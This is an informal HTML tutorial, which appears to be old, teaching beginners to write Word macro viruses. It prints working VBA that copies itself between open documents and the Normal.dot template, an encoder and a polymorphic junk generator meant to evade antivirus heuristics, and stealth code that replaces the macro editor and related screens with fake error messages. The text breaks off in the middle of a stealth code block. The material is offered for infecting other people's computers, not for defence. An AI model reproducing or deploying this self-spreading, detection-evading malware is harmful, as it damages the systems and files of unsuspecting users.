<p><b><u>The MacroVirusWriting Tutorial by anonymous</u></b>
<P><B>Introduction</B></FONT><FONT color=#000000><BR>In this document, I assume you are an beginner at MacroVirus writing (but for more advanced people there is handy information in here too!). If you have not yet programmed a virus yet, do not skip parts! Before we begin, I advice you to make a copy of your normal.dot incase you (or we) screw something up in it. So let's begin.</FONT></P><P><FONT color=#000000 size=4><B>What's A MacroVirus</B></FONT><FONT color=#000000><BR>A MacroVirus, which i am now reffering to as a MV (saving my fingers) is an virus made in words visual basic, or other macro supporting programs. The best Word version to make a virus in is to my knowledge Word97, because you can turn off Macro's and view there source. Virusses made in this language may look nonharming (Word elements always look so cudly) but they can destroy someones computer! A MV (a one that likes to spread itself afcourse) can be spread multiple ways, but the main function used to do this is copying itself to the normal.dot. (Normal.dot is the main template used by activedocuments.). If a new document is opened, that uses the infected template, the virus copies it to that document (if it's not there already afcourse). If you can almost not wait to begin after reading this, you'll probably become a good (M)Vprogrammer.</FONT></P><P><FONT size=4><B>Starting to write</B></FONT><BR>An MV is started when Word starts an event. The mainevents are displayed below:<BR><FONT size=3><B>AutoExec()</B></FONT><FONT size=2><B> </B></FONT>- Infects when word/document is opened. But I don't reccomend you using this too much since an higher protection level in Word disables this but Document_Open not.<BR><B>Document_Open()</B> - Basically the same as AutoExec<BR><B>AutoExit()</B> - Infects when an Document is closed<BR><B>Document_Close()</B> - Almost same as AutoExit<BR><B>FileSave()</B> - Infects when document is saved (this is a little bit harder because you have to replace the save function etc )<BR><B>FileSaveAs() </B>- I think this one is clear<BR><B>ToolsSpelling() </B>- Infects on spelling check<BR><B>ToolsGrammar() </B>- Infects on grammar check<BR>And finally:<BR><B>ViewVBCode()</B>, <B>ToolsMacro()</B> and <B>FileTemplates()</B> - mainly used for stealth (so the user cannot see your virus's code)</P><P>How to inplement this is not very hard. Just open your Word97/2000 select Extra, then Macro and VisualBasiceditor. It can mostly also be started by pushing Alt+F11. Then, in the new opened screen, push the Screen button and ProgramCode. Now you have a white screen where you can typ in :-)<BR>Oke then, typ or copy the following (ey, you can thank me for manually colour coding codes later)<BR><BR><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Document_Open()<BR>MsgBox "Hello World", vbInformation </FONT><FONT face=Verdana color=#008040 size=2>' Not a very original line I agree</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P><FONT color=#000000 size=3>Ok, now push the play button (something like this l&gt;). Yay an message box telling you 'Hello World'! (The green line behind it was only comment), if you pushed save now, closed the document and opened it again it would say 'Hello World' again (after probably a warning message about Macro's, how to deactivate those warinings comes later). But don't send this to all your friends yet! It will get a lot more fun (writing this chapter was a pain in my ass :-)).</FONT></P><P><FONT color=#000000 size=3>So, to resume on the message boxes, i'll give you another code that will give three message boxes (believe me, it'll come in handy later)</FONT></P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Document_Open()<BR></FONT><FONT face=Verdana color=#000080 size=2>For </FONT><FONT face=Verdana color=#000000 size=2>i = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana color=#000000 size=2> 3</FONT><FONT face=Verdana size=2><BR>MsgBox "Counting 1 to 3", vbInformation<BR></FONT><FONT face=Verdana color=#000080 size=2>Next </FONT><FONT face=Verdana color=#000000 size=2>i</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P><FONT color=#000000 size=3>Ok, you get this right? For each (no decimal) number between (and including) 1 and 3 display an message box. Ok, now afcourse you can put for 3 10000000000 and send it to someone you don't like (get the picture), but that's really isn't a MV.</FONT></P><P><FONT color=#000000 size=4><B>Infecting doc files</B></FONT><FONT color=#000000 size=3><BR>Jumping to this chapter so fast may seem odd to you, but between displaying a messagebox and infecting a file isn't so much difference.</FONT></P><P><FONT color=#000000 size=3>Ok, you now know how to open the Programcode screen. Now you need to make a new module (I mainly use modules so I teach you howto). Push Insert (next to Screen) and Module. A new white screen opens. </FONT></P><P><FONT color=#000000 size=3>Well, I've told you how infection takes place (from infected doc to normal template and from normal template to other documents). So why not make a function that checks the normal template for infection, and if it's not infected, infect it!</FONT></P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Document_Open() </FONT><FONT face=Verdana color=#008040 size=2>' When your document is opened</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>bp = "C:\Windows\tempx.txt"</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' temp virus holder</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If </FONT><FONT face=Verdana size=2>NormalTemplate.VBProject.VBComponents.Count = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' If there is only one component then...</FONT><FONT face=Verdana size=2><BR>ActiveDocument.VBProject.VBComponents.Item(2).Export(bp) </FONT><FONT face=Verdana color=#008040 size=2>' Copy the module to tempx.txt</FONT><FONT face=Verdana size=2><BR>NormalTemplate.VBProject.VBComponents.Import(bp) </FONT><FONT face=Verdana color=#008040 size=2>' Let NormalTemplate import the virus</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' Close If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P>Well, the above basically says: If there is only one component (called ThisDocument) NormalTemplate has not been infected yet, otherwise it would have been 2. So then copy the ActiveDocument's module (the virus) to tempx.txt and let NormalTemplate copy the virus to itself.</P><P>Afcourse this simple MV wouldn't be complete without the function of copying the virus from the NormalTemplate to (another, not yet infected ActiveDocument). This is not too hard to come up with.</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Document_Close() </FONT><FONT face=Verdana color=#008040 size=2>' When a document is closed</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>bp = "C:\Windows\tempy.txt"</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' temp virus holder</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If </FONT><FONT face=Verdana size=2>ActiveDocument.VBProject.VBComponents.Count = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' If there is only one component then...</FONT><FONT face=Verdana size=2><BR>NormalTemplate.VBProject.VBComponents.Item(2).Export(bp) </FONT><FONT face=Verdana color=#008040 size=2>' Copy the module to tempy.txt</FONT><FONT face=Verdana size=2><BR>ActiveDocument.VBProject.VBComponents.Import(bp) </FONT><FONT face=Verdana color=#008040 size=2>' Let ActiveDocument import the virus</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' Close If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P>Saw how easy this is? I just switched ActiveDocument and NormalTemplate and done, we have created a real live MV! But if you're thinking about saving this and doing something with it, think twice. Your AntiVirus (I assume you have one) will probably delete, or quarantine it at once (this will also happen with someone you send it to). So we goto the next chapter, avoiding AntiVirus detection. (Avoiding User detection will come too).</P><P><FONT size=4><B>Avoiding AntiVirus detection</B></FONT><BR>This may be the hardest part of MV programming. In an AntiVirus (the most common used are McAfee and NortonAntiVirus) there is a component called BloodHound (in Norton it's called that way). BloodHound doesn't watch files for known virusses, but for signs of virusses. With MV's these signs are mostly the use of funtions often used by virusses. So, what to do about it? Create another route to obtain the same objective. First, think about how the AV catches your virus. Then come up with a way to avoid detection, and finally implement it. If your own AV catches you, back to step one. So what about a little example.</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Document_Open()<BR></FONT><FONT face=Verdana color=#000000 size=2>bp = "C:\Windows\tempx.txt"</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If </FONT><FONT face=Verdana size=2>NormalTemplate.VBProject.VBComponents.Count = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2><BR>ActiveDocument.VBProject.VBComponents.Item(2).<U>Export(bp)</U><BR>NormalTemplate.VBProject.VBComponents.<U>Import(bp)</U><BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub<BR>Sub</FONT><FONT face=Verdana size=2> Document_Close()<BR></FONT><FONT face=Verdana color=#000000 size=2>bp = "C:\Windows\tempy.txt"</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If </FONT><FONT face=Verdana size=2>ActiveDocument.VBProject.VBComponents.Count = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2><BR>NormalTemplate.VBProject.VBComponents.Item(2).<U>Export(bp)</U><BR>ActiveDocument.VBProject.VBComponents.<U>Import(bp)</U><BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P>Here you can see how the AV thinks. When searching thru your infected document it flags (now underlined) known virus parts. It then adds them up and voila, byebye virus.</P><P>In this case the AV has learned to flag a document as infected if it reads at least one Export and two Imports (this could be changed by now, so I'm learning you to think as the AV). This is very smart, but not smart enough to stop us from making a none detectable virus.</P><P>So, what can we do to stop the AV from flagging those three things. Encrypting your virus is an option that is likely to work, but hard to accomplish manually (it's not fun). It's less hard if you just use an existing one. Then you let the encryptor call your functions for <B>Document_Open</B> <B>AutoExec</B> <B>Document_Close</B> etc. Keep in mind It's is not as easy as it seems because if you infect an file with your virus, the encryptor has to be taken along with it (in another module). And it has to be run someway to encrypt the virus again. Are you still with me?</P><P>So the first step is to alter our virus so it can be properly encrypted. First we change the function names from <B>Document_Open</B> and <B>Document_Close</B> to <B>ua </B>and <B>ub</B> (i'm really good at making names :-P). We also make sure the encryption module also is copied (we <B>don't</B> want viruswarnings remember). We also add, for stealth (it's another chapter, but it'll come handy now), On Error Resume Next. This is the first module then:</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> ua()<BR></FONT><FONT face=Verdana color=#0000a0 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' Don't alert the user or anything if something go's wrong</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>bp = "C:\Windows\tempx.txt"</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If </FONT><FONT face=Verdana size=2>NormalTemplate.VBProject.VBComponents.Count = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2><BR>ActiveDocument.VBProject.VBComponents.Item(2).Export(bp)<BR>NormalTemplate.VBProject.VBComponents.Import(bp)<BR>ActiveDocument.VBProject.VBComponents.Item(3).Export(bp) </FONT><FONT face=Verdana color=#008040 size=2>' also copy the encryptor</FONT><FONT face=Verdana size=2><BR>NormalTemplate.VBProject.VBComponents.Import(bp)<BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub<BR>Sub</FONT><FONT face=Verdana size=2> ub()<BR></FONT><FONT face=Verdana color=#0000a0 size=2>On Error Resume Next </FONT><FONT face=Verdana color=#008040 size=2>' Same here</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>bp = "C:\Windows\tempy.txt"</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If </FONT><FONT face=Verdana size=2>ActiveDocument.VBProject.VBComponents.Count = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2><BR>NormalTemplate.VBProject.VBComponents.Item(2).Export(bp)<BR>ActiveDocument.VBProject.VBComponents.Import(bp)<BR>NormalTemplate.VBProject.VBComponents.Item(3).Export(bp)<BR>ActiveDocument.VBProject.VBComponents.Import(bp)<BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P>You see, copying the encryptor isn't hard. Now we have to decide wether we want to make a encoder/decoder ourself or use an existing one (and maybe alter it somewhat). For the ease, I use an existing one (which I have created by the way, but just retrieved from storage). It doesn't really matter which one we pick (as long as it is not detected by an AV) because it isn't a polymorphic generator (it doesn't need fancy changing functions). So we have picked one, and we are now gonna have to change some of the functions in the encoder/decoder as well.</P><P><FONT face=Verdana color=#008040 size=2>Rem The Rem Encoder</FONT><FONT face=Verdana color=#000080 size=2><BR>Sub</FONT><FONT face=Verdana size=2> encode()<BR></FONT><FONT face=Verdana color=#000080 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> aol = ActiveDocument.VBProject.VBComponents<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> ni = aol.Item(2).CodeModule </FONT><FONT face=Verdana color=#008040 size=2>' our virus in the ActiveDocument</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana size=2> i = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana size=2> ni.CountOfLines<BR>ni.InsertLines i * 2 - 1, "Rem _" </FONT><FONT face=Verdana color=#008040 size=2>' Place a Rem so word and the AV sees it as comment</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Next</FONT><FONT face=Verdana size=2> i<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> lao = NormalTemplate.VBProject.VBComponents<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> op = lao.Item(2).CodeModule </FONT><FONT face=Verdana color=#008040 size=2>' our virus in the NormalTemplate</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana size=2> a = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana size=2> op.CountOfLines<BR>op.InsertLines a * 2 - 1, "Rem _"<BR></FONT><FONT face=Verdana color=#000080 size=2>Next</FONT><FONT face=Verdana size=2> a </FONT><FONT face=Verdana color=#008040 size=2>' Run the alghorithm again for the next a</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> decode()<BR></FONT><FONT face=Verdana color=#000080 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> aol = ActiveDocument.VBProject.VBComponents<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> ni = aol.Item(2).CodeModule<BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana size=2> i = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana size=2> ni.CountOfLines<BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana size=2> ni.Lines(i, 1) = "Rem _" </FONT><FONT face=Verdana color=#000080 size=2>Then </FONT><FONT face=Verdana color=#008040 size=2>' If the line is 'Rem _' then...</FONT><FONT face=Verdana size=2><BR>ni.DeleteLines i, 1 </FONT><FONT face=Verdana color=#008040 size=2>' delete it</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Next</FONT><FONT face=Verdana size=2> i<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> lao = NormalTemplate.VBProject.VBComponents<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana size=2> op = lao.Item(2).CodeModule<BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana size=2> a = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana size=2> op.CountOfLines<BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana size=2> op.Lines(a, 1) = "Rem _" </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2><BR>op.DeleteLines a, 1<BR></FONT><FONT face=Verdana color=#000080 size=2>End If<BR>Next</FONT><FONT face=Verdana size=2> a<BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> FileSave()<BR></FONT><FONT face=Verdana color=#000080 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>Application.Run ("ua") </FONT><FONT face=Verdana color=#008040 size=2>' run our two functions, </FONT><FONT face=Verdana color=#000000 size=2><BR>Application.Run ("ub")</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' so if the user saves, the virus will be too</FONT><FONT face=Verdana size=2><BR>Application.Run ("encode") </FONT><FONT face=Verdana color=#008040 size=2>' encode our virus so the AV won't see it</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana size=2> ActiveDocument.FullName = ActiveDocument.Name </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' if it's not saved yet then ...</FONT><FONT face=Verdana size=2><BR>Dialogs(wdDialogFileSaveAs).Show </FONT><FONT face=Verdana color=#008040 size=2>' show the saveas dialog</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Else</FONT><FONT face=Verdana size=2> </FONT><FONT face=Verdana color=#008040 size=2>' otherwise...</FONT><FONT face=Verdana size=2><BR>Document.Save </FONT><FONT face=Verdana color=#008040 size=2>' just save it</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR>Application.Run ("decode") </FONT><FONT face=Verdana color=#008040 size=2>' decode our virus since the document is saved</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> FileSaveAs()<BR></FONT><FONT face=Verdana color=#000080 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>decode: decode<BR>Application.Run ("ua")<BR>Application.Run ("ub")</FONT><FONT face=Verdana size=2><BR>Application.Run ("encode")<BR>Dialogs(wdDialogFileSaveAs).Show </FONT><FONT face=Verdana color=#008040 size=2>' after encoding the virus, show the window the user has asked for</FONT><FONT face=Verdana size=2><BR>Application.Run ("decode")<BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub<BR>Sub AutoClose()<BR>On Error Resume Next<BR></FONT><FONT face=Verdana color=#000000 size=2>decode: decode </FONT><FONT face=Verdana color=#008040 size=2>' one decode would have been enough though (just to be sure)</FONT><FONT face=Verdana color=#000000 size=2><BR>Application.Run ("encode")</FONT><FONT face=Verdana color=#000080 size=2> </FONT><FONT face=Verdana color=#008040 size=2>' encode so if the document gets saved, the AV won't see it</FONT><FONT face=Verdana color=#000080 size=2><BR>If </FONT><FONT face=Verdana color=#000000 size=2>ActiveDocument.FullName = ActiveDocument.Name &amp; document.saved</FONT><FONT face=Verdana color=#000080 size=2> Then </FONT><FONT face=Verdana color=#008040 size=2>' if the document was not saved yet then..</FONT><FONT face=Verdana color=#000080 size=2><BR>Else </FONT><FONT face=Verdana color=#008040 size=2>' but if it was saved .....</FONT><FONT face=Verdana color=#000080 size=2><BR></FONT><FONT face=Verdana color=#000000 size=2>ActiveDocument.SaveAs (ActiveDocument.FullName)</FONT><FONT face=Verdana color=#000080 size=2><BR>End If<BR>End Sub</FONT></P><P><FONT color=#000000>Ok, that isn't so hard to understand (since I commented and colourcoded the entire code!). If you make a new document, open the vbeditor, make two modules an paste this code in them, close the editor, and press the save button in your document....it works! Jay! (except if your AV has been updated so it deletes it anyways, but let us not think about that). .</FONT></P><P><FONT color=#000000>Now there is something left, what we could (no must) do. Make the virus Polymorphic (self changing). Don't panic, a polymorphic virus doesn't make changes in its functions (not the simple one we are going to use), it just adds random junk to your code (comments). A function that does that isn't so hard to come up with (although I spent half an hour making this one). </FONT></P><P><FONT face=Verdana color=#008040 size=2>Rem DoubleC (simple polymorphic generator)</FONT><FONT face=Verdana color=#000080 size=2><BR>Sub</FONT><FONT face=Verdana color=#000000 size=2> doubleC()<BR></FONT><FONT face=Verdana color=#000080 size=2>On Error Resume Next</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana color=#000000 size=2> t = 1 </FONT><FONT face=Verdana color=#000080 size=2>To </FONT><FONT face=Verdana color=#000000 size=2>2<BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana color=#000000 size=2> t = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then Set</FONT><FONT face=Verdana color=#000000 size=2> hat = ActiveDocument.VBProject<BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana color=#000000 size=2> t = 2 </FONT><FONT face=Verdana color=#000080 size=2>Then Set</FONT><FONT face=Verdana color=#000000 size=2> hat = NormalTemplate.VBProject<BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana color=#000000 size=2> l = 2 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana color=#000000 size=2> hat.VBComponents.Count<BR></FONT><FONT face=Verdana color=#000080 size=2>Set</FONT><FONT face=Verdana color=#000000 size=2> rat = hat.VBComponents.Item(l).CodeModule<BR>AB = Application.UserAddress </FONT><FONT face=Verdana color=#008040 size=2>' We're going to use the usersadress for storage :-P</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>For</FONT><FONT face=Verdana color=#000000 size=2> i = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana color=#000000 size=2> rat.CountOfLines<BR>Application.UserAddress = "": chello = rat.Lines(i, 1): adde = 0 </FONT><FONT face=Verdana color=#008040 size=2>' define chello is line ..., save spave using :</FONT><FONT face=Verdana color=#000000 size=2><BR>For a = 1 </FONT><FONT face=Verdana color=#000080 size=2>To</FONT><FONT face=Verdana color=#000000 size=2> Len(chello) </FONT><FONT face=Verdana color=#008040 size=2>' For every character of chello</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana color=#000000 size=2> Mid(chello, a, 4) = " '" + "'" </FONT><FONT face=Verdana color=#000080 size=2>Or</FONT><FONT face=Verdana color=#000000 size=2> adde = 1 </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana color=#000000 size=2><BR>adde = 1 </FONT><FONT face=Verdana color=#008040 size=2>' If the three following characters are [space]'' then adde = 1</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Else</FONT><FONT face=Verdana color=#000000 size=2><BR>Application.UserAddress = Application.UserAddress &amp; Mid(chello, a, 1) </FONT><FONT face=Verdana color=#008040 size=2>' add a char. of the line it's using</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End If<BR>Next</FONT><FONT face=Verdana color=#000000 size=2> a<BR>Application.UserAddress = Application.UserAddress &amp; " '" + "' " + Chr(Int((100 * Rnd) + 34)) + Chr(Int((100 * Rnd) + 34)) + Chr(Int((100 * Rnd) + 34)) + Chr(Int((100 * Rnd) + 34)) </FONT><FONT face=Verdana color=#008040 size=2>' make a random string and add it</FONT><FONT face=Verdana color=#000000 size=2><BR>rat.ReplaceLine i, Application.UserAddress</FONT><FONT face=Verdana color=#008040 size=2> ' replace the old, with the new line</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Next i</FONT><FONT face=Verdana color=#000000 size=2><BR>Application.UserAddress = AB </FONT><FONT face=Verdana color=#008040 size=2>' nicely return the users his adress, we before saved</FONT><FONT face=Verdana color=#000000 size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>Next</FONT><FONT face=Verdana color=#000000 size=2> l: </FONT><FONT face=Verdana color=#000080 size=2>Next</FONT><FONT face=Verdana color=#000000 size=2> t<BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P><FONT color=#000000>Fiew, that wasn't as long as you feared, was it :-). Now the difference between the encoder and polymorphic generator is that the polymorphic generator also makes itself polymorphic, and the encoder not.</FONT></P><P><FONT color=#000000>We then place the polymorphic generator within the (not yet encrypted) virus module, so it will be encrypted, too. This is much saver because loads of AV's see polymorphic generators alone already as viruses.we then replace the Save Function of the encryptor with this one (basically the same but with one added function).</FONT></P><P><FONT face=Verdana size=2>Sub FileSave()<BR></FONT><FONT face=Verdana color=#000080 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2><BR>doubleC </FONT><FONT face=Verdana color=#008040 size=2>' We've only added this line</FONT><FONT face=Verdana size=2><BR>Application.Run ("encode")<BR></FONT><FONT face=Verdana color=#000080 size=2>If</FONT><FONT face=Verdana size=2> ActiveDocument.FullName = ActiveDocument.Name </FONT><FONT face=Verdana color=#000080 size=2>Then</FONT><FONT face=Verdana size=2><BR>Dialogs(wdDialogFileSaveAs).Show<BR></FONT><FONT face=Verdana color=#000080 size=2>Else</FONT><FONT face=Verdana size=2><BR>Document.Save<BR></FONT><FONT face=Verdana color=#000080 size=2>End If</FONT><FONT face=Verdana size=2><BR>Application.Run ("decode")<BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P><FONT color=#000000>Oke then. All of this done and we have an selfencoding, (simple) polymorphic macrovirus.</FONT></P><P><FONT color=#000000>But what if the user becomes suspicious, looks in the VBProject of Word, sees the virus and starts deleting it manually? Read on...</FONT></P><P><FONT size=4><B>Avoiding user detection<BR></B></FONT><FONT size=3>You could say this chapter is less hard. AV's are updated every day but methods to fool (stupid) users can stay the same for years. </FONT></P><P><FONT size=3>The main way for stealth is disabling the screens who can tell the users macros are in the document. The easiest way is by disabling the screens by replacing them for fake errors. Keep in mind that adding them should be the last you do. Otherwise you can't access your own virus code anymore :-(.</FONT></P><P>Ok, first we disable the VBScreen. We do this by adding this code to the (virus) module.</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> ViewVBCode()<BR>MsgBox "Cannot find ''RMac14dl.dll'' in cdx000892315", 16, "VBEdit" </FONT><FONT face=Verdana color=#008040 size=2>' A really creative error line</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P>Then disable the Macro's screen... (with the same error)</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=1> </FONT><FONT face=Verdana size=2>ToolsMacro()<BR>MsgBox "Cannot find ''RMac14dl.dll'' in cdx000892315", 16, "VBEdit" </FONT><FONT face=Verdana color=#008040 size=2>' the same error</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub</FONT></P><P><FONT color=#000000 size=3>Disable yet another screen</FONT></P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana color=#000000 size=2> FileTemplates()</FONT><FONT face=Verdana color=#000000 size=3><BR></FONT><FONT face=Verdana size=2>MsgBox "Cannot find ''RMac14dl.dll'' in cdx000892315", 16, "VBEdit"</FONT><FONT face=Verdana color=#000000 size=3><BR></FONT><FONT face=Verdana color=#000080 size=2>End Sub </FONT></P><P>You can accomplish this also by making a new userform (and make it look like an empty macros... screen) and calling it by the following code. The only problem with it, is that if you use this second way (a lot more convincing way) your virus has to take it with it (the code below and the userform files (2) ).</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Filetemplates()<BR></FONT><FONT face=Verdana color=#0000a0 size=2>On Error GoTo Error</FONT><FONT face=Verdana size=2><BR>UserForm1.Show </FONT><FONT face=Verdana color=#008040 size=2>' Show the userform you've made</FONT><FONT face=Verdana size=2><BR>Error: </FONT><FONT face=Verdana color=#008040 size=2>' I found this written by Talon - The Eifel Epidemic</FONT><FONT face=Verdana size=2><BR></FONT><FONT face=Verdana color=#0000a0 size=2>End Sub</FONT></P><P>Ok, now we have disabled the two main ways users can use to access your virus. Now let us disable some other things that may give away our virus. The most smart thing to do is to put them in Document_Open.</P><P><FONT face=Verdana color=#000080 size=2>Sub</FONT><FONT face=Verdana size=2> Document_Open()<BR></FONT><FONT face=Verdana color=#0000a0 size=2>On Error Resume Next</FONT><FONT face=Verdana size=2><BR>CommandBars("Tools").Controls("Customize...").Enabled = False </FONT><FONT face=Verdana color=#008040 size=2>' disable the Customize... in Tools</FONT><FONT face=Verdana 